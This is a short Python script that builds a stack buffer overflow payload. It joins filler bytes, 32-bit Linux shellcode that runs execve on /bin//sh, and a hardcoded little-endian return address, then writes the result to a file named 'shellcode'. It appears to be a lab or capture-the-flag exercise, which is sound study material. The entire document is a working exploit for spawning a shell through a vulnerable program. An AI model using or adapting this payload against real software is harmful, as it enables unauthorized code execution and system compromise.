#!/bin/env python3

word = 'garbage'
buf = 128
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
garbage = str(word * (132-len(shellcode)//len(word)+1))[0:buf-len(shellcode)+4].encode('utf-8')
ret_addr = b"\xff\xff\xd8\x40"[-1::-1]

if __name__ == '__main__':
    print('LEN GARBAGE: %s' % len(garbage))
    with open('shellcode', 'wb') as w:
        w.write(garbage+shellcode+ret_addr)
        w.close()
    print("Write %s bytes to ./shellcode" % len(garbage+shellcode+ret_addr))
